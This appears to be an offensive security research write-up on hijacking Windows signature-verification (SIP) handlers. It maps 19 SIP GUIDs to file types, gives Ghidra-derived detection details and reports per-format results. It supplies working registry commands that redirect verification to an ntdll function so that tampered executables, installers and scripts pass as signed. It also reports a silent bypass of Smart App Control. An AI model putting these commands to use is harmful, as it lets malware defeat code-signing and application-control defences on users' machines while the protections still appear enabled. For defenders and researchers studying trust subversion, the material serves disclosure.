# Complete SIP GUID Map — With Hijack Results

Date: 2026-07-03
Source: Ghidra RE + runtime validation on Win10 22H2 & Win11 24H2

## 19 SIP GUIDs — Full Map

| # | GUID | Type | Hijack? | What it gives you |
|---|---|---|---|---|
| 1 | `C689AAB8` | **PE** (.exe/.dll/.sys) | ✅ Confirmed | Tampered PEs pass as validly signed |
| 2 | `C689AAB9` | **Java** (.class) | Untested | Legacy — no signed Java on modern Windows |
| 3 | `C689AABA` | **Cabinet** (.cab) | ✅ Confirmed | Tampered CABs pass signature check |
| 4 | `000C10F1` | **MSI** (.msi/.msp) | ✅ Confirmed | Modified installers appear Microsoft-signed |
| 5 | `603BCC1F` | **PowerShell** (.ps1/.psm1/.psd1/.cdxml/.mof) | ✅ Confirmed | Any script passes AllSigned policy |
| 6 | `06C9E010` | **JScript** (.js/.jse) | ✅ Valid stays valid | Tampered JS bypasses WSH signing check |
| 7 | `1629F04E` | **VBScript** (.vbs/.vbe) | ✅ Valid stays valid | Tampered VBS bypasses signing check |
| 8 | `1A610570` | **WSF** (.wsf/.wsc) | ✅ Valid stays valid | Tampered WSF bypasses signing check |
| 9 | `0AC5DF4B` | **AppX/MSIX** (.appx/.msix) | Untested | Could bypass Store app signature check |
| 10 | `0F5F58B3` | **AppX Bundle** (.appxbundle) | Untested | Same — Store bundles |
| 11 | `CF78C6DE` | **Encrypted AppX** (.eappx) | Untested | Same — encrypted packages |
| 12 | `D1D04F0C` | **Encrypted AppX Bundle** | Untested | Same — encrypted bundles |
| 13 | `5598CFF1` | **P7X** (.p7x) | Untested | Detached PKCS#7 signatures |
| 14 | `1AD2DCB4` | **AppX Extensions** (Win11) | Untested | Internal MSIX extension format |
| 15 | `9BA61D3F` | **CTL** (.ctl/.stl) | ✅ Valid stays valid | Certificate Trust Lists pass tampered |
| 16 | `DE351A42` | **Flat/raw** (fallback) | Untested | Catchall SIP for unknown formats |
| 17 | `DE351A43` | **Catalog** (.cat) | ✅ Valid stays valid | Tampered catalogs pass verification |
| 18 | `9F3053C5` | **ESD/WIM** (MSWIM magic) | Untested | Windows images / update packages |
| 19 | `18B3C141` | **🔥 Smart App Control** (Win11) | **✅ BYPASS CONFIRMED** | **Unsigned unknown EXEs run on SAC-enforced machines. Novel — first public identification of this GUID.** |

---

## Handler DLL Groups

| DLL | SIPs | File Types |
|---|---|---|
| WINTRUST.DLL | 8 | PE, Java, Cabinet, CTL, Flat, Catalog, **Smart App Control**, Win11-unknown |
| MSISIP.DLL | 1 | MSI |
| pwrshsip.dll | 1 | PowerShell |
| wshext.dll | 3 | JScript, VBScript, WSF |
| AppxSip.dll | 5 | AppX, AppX Bundle, EAppX, EAppX Bundle, P7X, Extensions |
| EsdSip.dll | 1 | ESD/WIM |

---

## Detection Method (from Ghidra decompilation)

| GUID | How Windows identifies the file type |
|---|---|
| `C689AAB8` | MZ + PE magic (builtin wintrust) |
| `C689AAB9` | 0xCAFEBABE magic (builtin wintrust) |
| `C689AABA` | MSCF magic (builtin wintrust) |
| `DE351A42` | Fallback — any file not matched by others |
| `DE351A43` | PKCS#7 CTL OID check (builtin wintrust) |
| `9BA61D3F` | PKCS#7 CTL OID check (builtin wintrust) |
| `18B3C141` | Builtin wintrust — no IsMyFileType2 (SAC internal dispatch) |
| `000C10F1` | StgOpenStorage + OLE CLSID (MSI is OLE compound document) |
| `603BCC1F` | PsIsMyFileType (pwrshsip.dll) — checks PS extensions |
| `06C9E010` | _wcsicmp: `.js`, `.jse` |
| `1629F04E` | _wcsicmp: `.vbs`, `.vbe` |
| `1A610570` | _wcsicmp: `.wsf` |
| `0AC5DF4B` | _wcsicmp: `.appx`, `.msix`, `.pkgSignConfig`, `.tmp` |
| `0F5F58B3` | _wcsicmp: `.appxbundle`, `.msixbundle`, `.pkgSignConfig` |
| `CF78C6DE` | IStream read + format check (encrypted AppX magic) |
| `D1D04F0C` | IStream read + format check (encrypted AppX Bundle magic) |
| `5598CFF1` | SHCreateStreamOnFileEx + IStream read (P7X magic) |
| `9F3053C5` | `MSWIM` magic (0x4d4957534d) + header size 0xd0 |
| `1AD2DCB4` | ExtensionsSipIsFileSupportedName (AppxSip internal) |

---

## Hijack Technique (all SIPs use the same method)

```cmd
:: Hijack
reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{GUID}" /v Dll /t REG_SZ /d "C:\Windows\System32\ntdll.dll" /f
reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{GUID}" /v FuncName /t REG_SZ /d DbgUiContinue /f

:: Revert
reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{GUID}" /v Dll /t REG_SZ /d "ORIGINAL_DLL" /f
reg add "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{GUID}" /v FuncName /t REG_SZ /d "ORIGINAL_FUNC" /f
```

**Requires:** Admin (HKLM write) + reboot or new process (SIP DLLs cached in-process).

---

## Smart App Control Bypass Details (GUID #19)

**GUID:** `{18B3C141-AE0D-40F9-9465-E542AFC1ABC7}`
**Win11 only.** Not present on Win10.

**Discovery:** Reverse engineered from w11 24H2 wintrust.dll via Ghidra headless.
Found in builtin GUID table at .rdata 0x62410. String cross-references reveal:
- `$Kernel.Smartlocker.OriginClaim` — file origin EA
- `$Kernel.Purge.Smartlocker.Valid` — cached validation EA
- `$Kernel.Smartlocker.Hash` — file hash EA
- Export: `SrpCheckSmartlockerEAandProcessToken`

**Test results:**
- Pre-reboot: SAC correctly blocked unsigned EXE ("Smart App Control blocked an app")
- Post-reboot with hijack active: unsigned EXE ran, MessageBox displayed
- SAC settings UI showed "On" during bypass — enforcement silently disabled

**MITRE:** T1553.003 + T1562.001

---

## Summary Statistics

| Category | Count |
|---|---|
| Hijack confirmed (HashMismatch → Valid) | 3 (PE, MSI, CAB) |
| Hijack confirmed (prior TrustMeBro work) | 3 (PS1, JS, VBS) |
| Valid stays valid under hijack | 3 (CTL, Catalog, WSF) |
| **SAC bypass confirmed (novel)** | **1 (Smartlocker)** |
| Untested (no test files) | 8 (AppX family, ESD, Java, Flat, P7X) |
| Win11-only | 2 (Smartlocker, AppX Extensions) |
| **Total SIP GUIDs** | **19** |
